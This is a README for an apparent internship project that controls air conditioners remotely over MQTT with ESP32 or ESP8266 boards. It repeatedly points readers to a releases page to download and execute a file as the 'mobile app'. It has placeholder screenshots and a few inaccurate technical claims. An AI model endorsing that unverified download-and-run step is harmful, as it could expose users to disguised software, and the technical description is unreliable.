# IoT-Based Air Conditioning Control System for Smart Homes 🌬️🏠

![IoT AC Control](https://img.shields.io/badge/IoT_AC_Control-Active-brightgreen) ![GitHub Release](https://img.shields.io/badge/Download_Releases-blue) 

[Download the latest release here](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases)

## Table of Contents

- [Project Overview](#project-overview)
- [Features](#features)
- [Technologies Used](#technologies-used)
- [Getting Started](#getting-started)
- [Installation](#installation)
- [Usage](#usage)
- [Mobile App Interface](#mobile-app-interface)
- [Web Interface](#web-interface)
- [How It Works](#how-it-works)
- [Contributing](#contributing)
- [License](#license)

## Project Overview

This project is an IoT-based air conditioning control system developed during an internship. It allows users to monitor and control air conditioning units remotely. Using a microcontroller, such as the ESP32 or ESP8266, this system integrates seamlessly with a mobile app or web interface for real-time management. 

The goal is to enhance comfort and energy efficiency in homes. By leveraging the Internet of Things (IoT), users can adjust their AC settings from anywhere, ensuring optimal climate control.

## Features

- **Remote Control**: Manage your AC unit from anywhere using your smartphone or computer.
- **Real-Time Monitoring**: Get instant feedback on temperature and humidity levels.
- **User-Friendly Interface**: Simple and intuitive mobile app and web dashboard.
- **Energy Efficiency**: Optimize AC usage to save on electricity bills.
- **Notifications**: Receive alerts for maintenance and unusual activity.
- **Multi-Device Support**: Control multiple AC units from a single interface.

## Technologies Used

This project incorporates various technologies to create a robust and efficient system:

- **Microcontrollers**: ESP32, ESP8266
- **Programming Languages**: Arduino, Python
- **Communication Protocol**: MQTT
- **Web Framework**: Vercel
- **Dashboard**: Custom-built for easy access
- **Home Automation**: Integration with existing smart home systems

## Getting Started

To get started with this project, you will need the following:

1. **Microcontroller**: ESP32 or ESP8266
2. **Wi-Fi Network**: A stable internet connection
3. **Mobile Device or Computer**: For accessing the app or web interface
4. **Basic Knowledge**: Familiarity with Arduino and IoT concepts

## Installation

Follow these steps to install the system:

1. **Clone the Repository**: Use the following command to clone the project to your local machine:

   ```bash
   git clone https://github.com/Luixx222/Internship-Project-AC-Control-IOT.git
   ```

2. **Set Up the Microcontroller**: 
   - Install the necessary libraries in the Arduino IDE.
   - Upload the firmware to your ESP32 or ESP8266.

3. **Configure the Settings**: 
   - Modify the configuration file to set your Wi-Fi credentials.
   - Set the MQTT broker details.

4. **Download the App**: 
   - [Download the latest release here](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases) and execute the file to install the mobile app.

## Usage

Once installed, you can start using the system:

1. **Connect to Wi-Fi**: Ensure your microcontroller is connected to the internet.
2. **Open the Mobile App**: Launch the app on your device.
3. **Log In**: Use your credentials to log in.
4. **Control Your AC**: Use the interface to adjust settings, view temperature, and more.

## Mobile App Interface

The mobile app offers a clean and intuitive interface:

- **Dashboard**: View real-time data on temperature and humidity.
- **Control Panel**: Easily adjust settings with a few taps.
- **Notifications**: Get alerts for maintenance needs and system updates.

### Screenshots

![Mobile Dashboard](https://example.com/mobile-dashboard.png)
![Control Panel](https://example.com/control-panel.png)

## Web Interface

The web interface provides a comprehensive view of your AC system:

- **User Management**: Add or remove users easily.
- **Historical Data**: View past performance and usage statistics.
- **Settings**: Customize your preferences for notifications and alerts.

### Screenshots

![Web Dashboard](https://example.com/web-dashboard.png)
![Settings Page](https://example.com/settings-page.png)

## How It Works

The system operates using the following components:

1. **Microcontroller**: The ESP32/ESP8266 collects data from the AC unit and sends it to the cloud.
2. **MQTT Protocol**: This lightweight messaging protocol facilitates communication between the microcontroller and the app.
3. **Mobile/Web Interface**: Users interact with the system through these interfaces, sending commands to the microcontroller.

### Data Flow

- The microcontroller reads temperature and humidity data from the AC unit.
- It publishes this data to the MQTT broker.
- The mobile app subscribes to this data and displays it in real-time.

## Contributing

Contributions are welcome! If you want to contribute to this project, please follow these steps:

1. **Fork the Repository**: Create your own copy of the repository.
2. **Create a Branch**: Use a descriptive name for your branch.
3. **Make Changes**: Implement your features or fixes.
4. **Submit a Pull Request**: Share your changes with the community.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

For more information, visit the [Releases section](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases) to download the latest version.